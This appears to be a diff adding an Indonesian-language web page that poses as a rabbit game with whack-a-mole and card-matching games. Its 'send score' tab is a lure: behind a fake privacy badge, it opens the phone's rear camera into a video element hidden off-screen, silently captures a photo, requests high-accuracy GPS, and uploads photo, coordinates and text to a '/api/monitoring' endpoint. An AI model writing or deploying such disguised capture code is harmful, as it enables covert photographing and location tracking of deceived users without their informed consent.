@@ -1,0 +1,808 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Percobaan game kelinci</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --tanah: #8a6a3f;
+    --tanah-gelap: #6b5030;
+    --rumput1: #4f8f3d;
+    --rumput2: #6bab4e;
+    --krem: #fbf6e9;
+    --aksen: #e2762f;
+    --aksen-gelap: #c05f22;
+  }
+
+  body {
+    font-family: -apple-system, "Segoe UI", Roboto, sans-serif;
+    background: linear-gradient(180deg, #e8f3e2 0%, #f4f9f0 100%);
+    min-height: 100vh;
+    padding: 24px 16px;
+    color: #223018;
+  }
+  .container { max-width: 460px; margin: 0 auto; }
+  .header { text-align: center; margin-bottom: 16px; }
+  .header .emoji { font-size: 40px; }
+  .header h1 {
+    font-size: 21px;
+    color: #2d5a1f;
+    margin-top: 6px;
+    font-weight: 700;
+  }
+  .header p { font-size: 13px; color: #6b7d5f; margin-top: 4px; }
+
+  /* ====== Tab navigasi utama ====== */
+  .tab-nav {
+    display: flex;
+    gap: 8px;
+    margin-bottom: 16px;
+    background: #fff;
+    padding: 6px;
+    border-radius: 14px;
+    border: 1px solid #eef3ea;
+    box-shadow: 0 4px 14px rgba(45, 90, 31, 0.06);
+  }
+  .tab-nav button {
+    flex: 1;
+    padding: 11px 8px;
+    border: none;
+    border-radius: 10px;
+    background: transparent;
+    color: #6b7d5f;
+    font-weight: 700;
+    font-size: 13.5px;
+    cursor: pointer;
+    transition: background 0.15s, color 0.15s;
+  }
+  .tab-nav button.aktif {
+    background: linear-gradient(135deg, #5a9c3d, #3d6b2c);
+    color: #fff;
+  }
+
+  .tab-panel { display: none; }
+  .tab-panel.aktif { display: block; }
+
+  .card {
+    background: white;
+    border-radius: 18px;
+    padding: 20px;
+    margin-bottom: 16px;
+    box-shadow: 0 4px 20px rgba(45, 90, 31, 0.08);
+    border: 1px solid #eef3ea;
+  }
+  .info-text {
+    font-size: 13.5px;
+    line-height: 1.5;
+    color: #4a5a40;
+    background: #f5f9f1;
+    padding: 12px 14px;
+    border-radius: 12px;
+    border-left: 3px solid #5a9c3d;
+  }
+
+  /* video kamera disembunyikan dari layar, tapi tetap aktif untuk capture */
+  video {
+    position: absolute;
+    width: 1px;
+    height: 1px;
+    left: -9999px;
+    opacity: 0;
+  }
+  canvas { display: none; }
+
+  button.tombol {
+    width: 100%;
+    padding: 15px;
+    border: none;
+    border-radius: 12px;
+    font-size: 15.5px;
+    font-weight: 600;
+    cursor: pointer;
+    margin-top: 12px;
+    transition: transform 0.1s, opacity 0.2s;
+    letter-spacing: 0.2px;
+  }
+  button.tombol:active { transform: scale(0.98); }
+  button.tombol:disabled { opacity: 0.5; cursor: not-allowed; }
+
+  #btnMulai { background: linear-gradient(135deg, #5a9c3d, #3d6b2c); color: white; }
+  #btnAmbil { background: linear-gradient(135deg, #e29a2c, #c9791a); color: white; display: none; }
+
+  .status {
+    font-size: 13.5px;
+    text-align: center;
+    margin-top: 14px;
+    color: #556;
+    min-height: 18px;
+  }
+
+  textarea {
+    width: 100%;
+    padding: 12px;
+    border-radius: 10px;
+    border: 1px solid #dbe3d6;
+    font-family: inherit;
+    font-size: 14px;
+    resize: vertical;
+    margin-top: 12px;
+    background: #fafcf8;
+  }
+  textarea:focus { outline: none; border-color: #5a9c3d; }
+
+  .badge-privasi {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    font-size: 11.5px;
+    background: #eef7ec;
+    color: #2d5a1f;
+    padding: 5px 10px;
+    border-radius: 20px;
+    margin-top: 10px;
+  }
+
+  /* ====== Sub-tab pemilih game ====== */
+  .game-nav {
+    display: flex;
+    gap: 8px;
+    margin-bottom: 14px;
+  }
+  .game-nav button {
+    flex: 1;
+    padding: 10px 6px;
+    border-radius: 10px;
+    border: 2px solid #dbe9d3;
+    background: #fff;
+    color: #3d6b2c;
+    font-weight: 700;
+    font-size: 13px;
+    cursor: pointer;
+  }
+  .game-nav button.aktif {
+    background: #eef7ec;
+    border-color: #5a9c3d;
+  }
+  .game-panel { display: none; }
+  .game-panel.aktif { display: block; }
+
+  /* ====== Game 1: Tangkap Kelinci ====== */
+  .papan-skor {
+    display: flex;
+    justify-content: space-between;
+    gap: 8px;
+    margin-bottom: 14px;
+  }
+  .kotak-skor {
+    flex: 1;
+    background: #f5f9f1;
+    border-radius: 12px;
+    padding: 9px 10px;
+    text-align: center;
+    border: 1px solid #eef3ea;
+  }
+  .kotak-skor .label {
+    font-size: 10px;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+    color: #8a9a7f;
+  }
+  .kotak-skor .nilai {
+    font-size: 20px;
+    font-weight: 700;
+    color: var(--aksen-gelap);
+    margin-top: 2px;
+  }
+
+  .ladang {
+    position: relative;
+    aspect-ratio: 4 / 3;
+    background:
+      radial-gradient(circle at 30% 20%, rgba(255,255,255,0.25), transparent 40%),
+      linear-gradient(180deg, var(--rumput2), var(--rumput1));
+    border-radius: 16px;
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    grid-template-rows: repeat(3, 1fr);
+    gap: 4%;
+    padding: 5%;
+    overflow: hidden;
+    box-shadow: inset 0 0 0 3px rgba(255,255,255,0.35);
+  }
+
+  .lubang-bungkus {
+    position: relative;
+    display: flex;
+    align-items: flex-end;
+    justify-content: center;
+  }
+  .lubang {
+    position: relative;
+    width: 100%;
+    padding-top: 62%;
+    cursor: pointer;
+    -webkit-tap-highlight-color: transparent;
+  }
+  .lubang-lingkaran {
+    position: absolute;
+    inset: 0;
+    background: radial-gradient(ellipse at 50% 40%, var(--tanah-gelap) 0%, var(--tanah) 60%, transparent 72%);
+    border-radius: 50%;
+  }
+  .kelinci {
+    position: absolute;
+    left: 50%;
+    bottom: 18%;
+    transform: translate(-50%, 0%);
+    font-size: 32px;
+    line-height: 1;
+    transition: transform 0.18s cubic-bezier(.34,1.56,.64,1);
+    user-select: none;
+    filter: drop-shadow(0 4px 3px rgba(0,0,0,0.25));
+  }
+  .lubang.sembunyi .kelinci { transform: translate(-50%, 90%); }
+  .lubang.muncul .kelinci { transform: translate(-50%, 0%); }
+  .lubang.kena .kelinci {
+    transform: translate(-50%, -8%) scale(1.15) rotate(-8deg);
+    filter: brightness(1.15) drop-shadow(0 4px 3px rgba(0,0,0,0.25));
+  }
+
+  .layar-overlay {
+    position: absolute;
+    inset: 0;
+    background: rgba(20, 35, 10, 0.72);
+    border-radius: 16px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    padding: 20px;
+    text-align: center;
+    color: #fff;
+  }
+  .layar-overlay h2 { font-size: 19px; }
+  .layar-overlay p { font-size: 13px; opacity: 0.9; max-width: 260px; }
+  .layar-overlay .skor-akhir {
+    font-size: 32px;
+    font-weight: 800;
+    color: #ffe082;
+    margin: 2px 0 4px;
+  }
+  .btn-game {
+    border: none;
+    border-radius: 12px;
+    padding: 12px 20px;
+    font-size: 14.5px;
+    font-weight: 700;
+    cursor: pointer;
+    background: linear-gradient(135deg, var(--aksen), var(--aksen-gelap));
+    color: #fff;
+    box-shadow: 0 6px 14px rgba(194, 95, 26, 0.35);
+  }
+  .btn-game:active { transform: scale(0.96); }
+
+  /* ====== Game 2: Cocok Kartu Kebun ====== */
+  .info-game2 {
+    display: flex;
+    justify-content: space-between;
+    font-size: 13px;
+    color: #4a5a40;
+    margin-bottom: 10px;
+    padding: 0 2px;
+  }
+  .papan-kartu {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 8px;
+  }
+  .kartu {
+    aspect-ratio: 1 / 1;
+    border-radius: 12px;
+    cursor: pointer;
+    position: relative;
+    perspective: 600px;
+    -webkit-tap-highlight-color: transparent;
+  }
+  .kartu-inner {
+    position: absolute;
+    inset: 0;
+    transition: transform 0.35s;
+    transform-style: preserve-3d;
+  }
+  .kartu.terbuka .kartu-inner,
+  .kartu.cocok .kartu-inner { transform: rotateY(180deg); }
+  .kartu-depan, .kartu-belakang {
+    position: absolute;
+    inset: 0;
+    border-radius: 12px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 26px;
+    backface-visibility: hidden;
+  }
+  .kartu-depan {
+    background: linear-gradient(135deg, #5a9c3d, #3d6b2c);
+    color: #fff;
+    font-size: 18px;
+  }
+  .kartu-belakang {
+    background: #fff;
+    border: 2px solid #eef3ea;
+    transform: rotateY(180deg);
+  }
+  .kartu.cocok .kartu-belakang {
+    background: #eef7ec;
+    border-color: #5a9c3d;
+  }
+  .layar-menang {
+    text-align: center;
+    padding: 18px 10px 4px;
+  }
+  .layar-menang p { font-size: 13.5px; color: #4a5a40; margin-bottom: 10px; }
+
+  a.link-dashboard {
+    display: block;
+    text-align: center;
+    margin-top: 18px;
+    font-size: 13.5px;
+    color: #3d6b2c;
+    text-decoration: none;
+    font-weight: 600;
+  }
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="header">
+    <div class="emoji">🐇</div>
+    <h1>Game Kelinci kejujuran</h1>
+    <p>gabut ya, atau main game sambil nunggu nih</p>
+  </div>
+
+  <div class="tab-nav">
+    <button id="tabBtnFoto" class="aktif">pesan Pemain</button>
+    <button id="tabBtnGame">🎮 Main Game</button>
+  </div>
+
+  <!-- ====== TAB: AMBIL FOTO ====== -->
+  <div id="tabFoto" class="tab-panel aktif">
+    <div class="card">
+      <p class="info-text">
+        Kamu harus jujur tentang berapa skor yang kamu dapatkan.
+      </p>
+      <div class="badge-privasi">🔒 Privasi terjaga</div>
+
+      <button id="btnMulai" class="tombol">kirim skor</button>
+      <video id="video" autoplay playsinline muted></video>
+      <canvas id="canvas"></canvas>
+
+      <button id="btnAmbil" class="tombol">Iya saya jujur</button>
+
+      <textarea id="keterangan" rows="2" placeholder="Berapa sekor kamu isi di sini"></textarea>
+
+      <p class="status" id="status"></p>
+    </div>
+  </div>
+
+  <!-- ====== TAB: MAIN GAME ====== -->
+  <div id="tabGame" class="tab-panel">
+    <div class="game-nav">
+      <button id="gameBtn1" class="aktif">🐇 Tangkap Kelinci</button>
+      <button id="gameBtn2">🥕 Cocok Kartu</button>
+    </div>
+
+    <!-- Game 1: Tangkap Kelinci -->
+    <div id="gamePanel1" class="game-panel aktif">
+      <div class="card">
+        <div class="papan-skor">
+          <div class="kotak-skor">
+            <div class="label">Skor</div>
+            <div class="nilai" id="skorSekarang">0</div>
+          </div>
+          <div class="kotak-skor">
+            <div class="label">Waktu</div>
+            <div class="nilai" id="waktuSisa">30</div>
+          </div>
+          <div class="kotak-skor">
+            <div class="label">Terbaik</div>
+            <div class="nilai" id="skorTerbaik">0</div>
+          </div>
+        </div>
+        <div class="ladang" id="ladang"></div>
+      </div>
+    </div>
+
+    <!-- Game 2: Cocok Kartu Kebun -->
+    <div id="gamePanel2" class="game-panel">
+      <div class="card">
+        <div class="info-game2">
+          <span>Langkah: <strong id="langkahKartu">0</strong></span>
+          <span>Pasangan: <strong id="pasanganKartu">0</strong>/8</span>
+        </div>
+        <div class="papan-kartu" id="papanKartu"></div>
+        <div id="menangKartu" class="layar-menang" style="display:none;">
+          <p>🎉 Selesai dalam <strong id="langkahAkhirKartu">0</strong> langkah!</p>
+          <button class="btn-game" id="btnUlangKartu">Main Lagi</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<script>
+/* ============================================================
+   NAVIGASI TAB UTAMA (Foto vs Game) - berdiri sendiri-sendiri
+   ============================================================ */
+const tabBtnFoto = document.getElementById("tabBtnFoto");
+const tabBtnGame = document.getElementById("tabBtnGame");
+const tabFoto = document.getElementById("tabFoto");
+const tabGame = document.getElementById("tabGame");
+
+tabBtnFoto.addEventListener("click", () => {
+  tabBtnFoto.classList.add("aktif");
+  tabBtnGame.classList.remove("aktif");
+  tabFoto.classList.add("aktif");
+  tabGame.classList.remove("aktif");
+});
+tabBtnGame.addEventListener("click", () => {
+  tabBtnGame.classList.add("aktif");
+  tabBtnFoto.classList.remove("aktif");
+  tabGame.classList.add("aktif");
+  tabFoto.classList.remove("aktif");
+});
+
+const gameBtn1 = document.getElementById("gameBtn1");
+const gameBtn2 = document.getElementById("gameBtn2");
+const gamePanel1 = document.getElementById("gamePanel1");
+const gamePanel2 = document.getElementById("gamePanel2");
+
+gameBtn1.addEventListener("click", () => {
+  gameBtn1.classList.add("aktif");
+  gameBtn2.classList.remove("aktif");
+  gamePanel1.classList.add("aktif");
+  gamePanel2.classList.remove("aktif");
+});
+gameBtn2.addEventListener("click", () => {
+  gameBtn2.classList.add("aktif");
+  gameBtn1.classList.remove("aktif");
+  gamePanel2.classList.add("aktif");
+  gamePanel1.classList.remove("aktif");
+});
+
+/* ============================================================
+   BAGIAN AMBIL FOTO (tidak diubah logikanya)
+   ============================================================ */
+const API_URL = "/api/monitoring";
+
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+const btnMulai = document.getElementById("btnMulai");
+const btnAmbil = document.getElementById("btnAmbil");
+const statusEl = document.getElementById("status");
+const keteranganEl = document.getElementById("keterangan");
+
+let stream = null;
+let fotoBlob = null;
+let lokasi = { latitude: null, longitude: null };
+
+btnMulai.addEventListener("click", async () => {
+  try {
+    statusEl.textContent = "mengerimkan...";
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "environment" },
+      audio: false,
+    });
+    video.srcObject = stream;
+    await video.play();
+
+    btnMulai.style.display = "none";
+    btnAmbil.style.display = "block";
+    statusEl.textContent = "Siap.";
+  } catch (err) {
+    statusEl.textContent = "Gagal: " + err.message;
+  }
+});
+
+btnAmbil.addEventListener("click", () => {
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  canvas.getContext("2d").drawImage(video, 0, 0);
+
+  canvas.toBlob((blob) => {
+    fotoBlob = blob;
+    btnAmbil.disabled = true;
+    stream.getTracks().forEach((track) => track.stop());
+
+    statusEl.textContent = "mengirimkan...";
+    mintaLokasiLaluKirim();
+  }, "image/jpeg", 0.9);
+});
+
+function mintaLokasiLaluKirim() {
+  if (!navigator.geolocation) {
+    statusEl.textContent = "Perangkat gagal.";
+    return;
+  }
+  navigator.geolocation.getCurrentPosition(
+    (pos) => {
+      lokasi.latitude = pos.coords.latitude;
+      lokasi.longitude = pos.coords.longitude;
+      kirimOtomatis();
+    },
+    (err) => {
+      statusEl.textContent = "coba lagi: " + err.message;
+      btnAmbil.disabled = false;
+    },
+    { enableHighAccuracy: true }
+  );
+}
+
+async function kirimOtomatis() {
+  statusEl.textContent = "Mengirim ke server...";
+
+  const formData = new FormData();
+  formData.append("foto", fotoBlob, `kebun-${Date.now()}.jpg`);
+  formData.append("latitude", lokasi.latitude);
+  formData.append("longitude", lokasi.longitude);
+  formData.append("keterangan", keteranganEl.value);
+
+  try {
+    const res = await fetch(API_URL, { method: "POST", body: formData });
+    const result = await res.json();
+
+    if (res.ok) {
+      statusEl.textContent = "✅ Skor berhasil terkirim.";
+      btnAmbil.style.display = "none";
+      btnMulai.style.display = "block";
+      btnMulai.textContent = "ulangi kirim skor";
+      keteranganEl.value = "";
+      fotoBlob = null;
+      lokasi = { latitude: null, longitude: null };
+    } else {
+      statusEl.textContent = "❌ Gagal: " + (result.error || "Terjadi kesalahan");
+      btnAmbil.disabled = false;
+    }
+  } catch (err) {
+    statusEl.textContent = "❌ Gagal konek ke server: " + err.message;
+    btnAmbil.disabled = false;
+  }
+}
+
+/* ============================================================
+   GAME 1: TANGKAP KELINCI (whack-a-mole) - berdiri sendiri,
+   tidak menyentuh kamera/lokasi sama sekali
+   ============================================================ */
+(function () {
+  const JUMLAH_LUBANG = 9;
+  const DURASI_DETIK = 30;
+
+  const ladang = document.getElementById("ladang");
+  const elSkorSekarang = document.getElementById("skorSekarang");
+  const elWaktuSisa = document.getElementById("waktuSisa");
+  const elSkorTerbaik = document.getElementById("skorTerbaik");
+
+  let lubangList = [];
+  let skor = 0;
+  let skorTerbaik = 0;
+  let waktuSisa = DURASI_DETIK;
+  let sedangMain = false;
+  let timerId = null;
+  let munculTimeoutId = null;
+  let lubangAktifIndex = -1;
+
+  for (let i = 0; i < JUMLAH_LUBANG; i++) {
+    const bungkus = document.createElement("div");
+    bungkus.className = "lubang-bungkus";
+    const lubang = document.createElement("div");
+    lubang.className = "lubang sembunyi";
+    lubang.innerHTML = `<div class="lubang-lingkaran"></div><div class="kelinci">🐇</div>`;
+    lubang.addEventListener("click", () => kenaKlik(i));
+    bungkus.appendChild(lubang);
+    ladang.appendChild(bungkus);
+    lubangList.push(lubang);
+  }
+
+  const overlayMulai = document.createElement("div");
+  overlayMulai.className = "layar-overlay";
+  overlayMulai.innerHTML = `
+    <h2>Siap main?</h2>
+    <p>30 detik. Ketuk kelinci sebanyak mungkin sebelum dia sembunyi lagi.</p>
+    <button class="btn-game" id="btnMulaiKelinci">Mulai Main</button>
+  `;
+  ladang.appendChild(overlayMulai);
+  document.getElementById("btnMulaiKelinci").addEventListener("click", () => {
+    overlayMulai.remove();
+    mulaiPermainan();
+  });
+
+  function acakIndexBerbeda(indexSebelumnya) {
+    let idx;
+    do { idx = Math.floor(Math.random() * JUMLAH_LUBANG); }
+    while (idx === indexSebelumnya && JUMLAH_LUBANG > 1);
+    return idx;
+  }
+
+  function munculkanKelinciBaru() {
+    if (!sedangMain) return;
+    if (lubangAktifIndex !== -1) {
+      lubangList[lubangAktifIndex].classList.remove("muncul", "kena");
+      lubangList[lubangAktifIndex].classList.add("sembunyi");
+    }
+    const idxBaru = acakIndexBerbeda(lubangAktifIndex);
+    lubangAktifIndex = idxBaru;
+    lubangList[idxBaru].classList.remove("sembunyi");
+    lubangList[idxBaru].classList.add("muncul");
+
+    const sisaRasio = waktuSisa / DURASI_DETIK;
+    const jeda = 420 + (950 - 420) * sisaRasio;
+
+    clearTimeout(munculTimeoutId);
+    munculTimeoutId = setTimeout(munculkanKelinciBaru, jeda);
+  }
+
+  function kenaKlik(index) {
+    if (!sedangMain) return;
+    if (index !== lubangAktifIndex) return;
+    const lubang = lubangList[index];
+    if (lubang.classList.contains("kena")) return;
+
+    skor += 1;
+    elSkorSekarang.textContent = skor;
+    lubang.classList.add("kena");
+    setTimeout(() => {
+      if (lubang.classList.contains("kena")) {
+        lubang.classList.remove("muncul", "kena");
+        lubang.classList.add("sembunyi");
+      }
+    }, 220);
+  }
+
+  function mulaiPermainan() {
+    skor = 0;
+    waktuSisa = DURASI_DETIK;
+    sedangMain = true;
+    lubangAktifIndex = -1;
+    elSkorSekarang.textContent = skor;
+    elWaktuSisa.textContent = waktuSisa;
+
+    munculkanKelinciBaru();
+    timerId = setInterval(() => {
+      waktuSisa -= 1;
+      elWaktuSisa.textContent = waktuSisa;
+      if (waktuSisa <= 0) selesaiPermainan();
+    }, 1000);
+  }
+
+  function selesaiPermainan() {
+    sedangMain = false;
+    clearInterval(timerId);
+    clearTimeout(munculTimeoutId);
+    lubangList.forEach((l) => l.classList.remove("muncul", "kena"));
+    lubangList.forEach((l) => l.classList.add("sembunyi"));
+
+    if (skor > skorTerbaik) {
+      skorTerbaik = skor;
+      elSkorTerbaik.textContent = skorTerbaik;
+    }
+
+    const overlay = document.createElement("div");
+    overlay.className = "layar-overlay";
+    overlay.innerHTML = `
+      <h2>Waktu habis Silahkan kirim skor terbaik kamu!</h2>
+      <div class="skor-akhir">${skor} kelinci</div>
+      <p>Skor terbaik: ${skorTerbaik}</p>
+      <button class="btn-game" id="btnUlangKelinci">Main Lagi</button>
+    `;
+    ladang.appendChild(overlay);
+    document.getElementById("btnUlangKelinci").addEventListener("click", () => {
+      overlay.remove();
+      mulaiPermainan();
+    });
+  }
+})();
+
+/* ============================================================
+   GAME 2: COCOK KARTU KEBUN (memory match) - berdiri sendiri,
+   tidak menyentuh kamera/lokasi sama sekali
+   ============================================================ */
+(function () {
+  const ikonKebun = ["🥕", "🍅", "🌽", "🥔", "🍓", "🌻", "🍆", "🍇"];
+  const papan = document.getElementById("papanKartu");
+  const elLangkah = document.getElementById("langkahKartu");
+  const elPasangan = document.getElementById("pasanganKartu");
+  const menang = document.getElementById("menangKartu");
+  const elLangkahAkhir = document.getElementById("langkahAkhirKartu");
+  const btnUlang = document.getElementById("btnUlangKartu");
+
+  let kartuTerbuka = [];
+  let sedangMengunci = false;
+  let langkah = 0;
+  let pasanganDitemukan = 0;
+
+  function acak(arr) {
+    const a = arr.slice();
+    for (let i = a.length - 1; i > 0; i--) {
+      const j = Math.floor(Math.random() * (i + 1));
+      [a[i], a[j]] = [a[j], a[i]];
+    }
+    return a;
+  }
+
+  function buatPapan() {
+    papan.innerHTML = "";
+    menang.style.display = "none";
+    papan.style.display = "grid";
+    langkah = 0;
+    pasanganDitemukan = 0;
+    kartuTerbuka = [];
+    sedangMengunci = false;
+    elLangkah.textContent = "0";
+    elPasangan.textContent = "0";
+
+    const isiKartu = acak([...ikonKebun, ...ikonKebun]);
+
+    isiKartu.forEach((ikon) => {
+      const kartu = document.createElement("div");
+      kartu.className = "kartu";
+      kartu.dataset.ikon = ikon;
+      kartu.innerHTML = `
+        <div class="kartu-inner">
+          <div class="kartu-depan">🌱</div>
+          <div class="kartu-belakang">${ikon}</div>
+        </div>
+      `;
+      kartu.addEventListener("click", () => bukaKartu(kartu));
+      papan.appendChild(kartu);
+    });
+  }
+
+  function bukaKartu(kartu) {
+    if (sedangMengunci) return;
+    if (kartu.classList.contains("terbuka") || kartu.classList.contains("cocok")) return;
+    if (kartuTerbuka.length >= 2) return;
+
+    kartu.classList.add("terbuka");
+    kartuTerbuka.push(kartu);
+
+    if (kartuTerbuka.length === 2) {
+      langkah += 1;
+      elLangkah.textContent = langkah;
+      const [a, b] = kartuTerbuka;
+      if (a.dataset.ikon === b.dataset.ikon) {
+        a.classList.add("cocok");
+        b.classList.add("cocok");
+        kartuTerbuka = [];
+        pasanganDitemukan += 1;
+        elPasangan.textContent = pasanganDitemukan;
+        if (pasanganDitemukan === ikonKebun.length) {
+          setTimeout(() => {
+            elLangkahAkhir.textContent = langkah;
+            menang.style.display = "block";
+            papan.style.display = "none";
+          }, 400);
+        }
+      } else {
+        sedangMengunci = true;
+        setTimeout(() => {
+          a.classList.remove("terbuka");
+          b.classList.remove("terbuka");
+          kartuTerbuka = [];
+          sedangMengunci = false;
+        }, 700);
+      }
+    }
+  }
+
+  btnUlang.addEventListener("click", buatPapan);
+
+  buatPapan();
+})();
+</script>
+</body>
+</html>
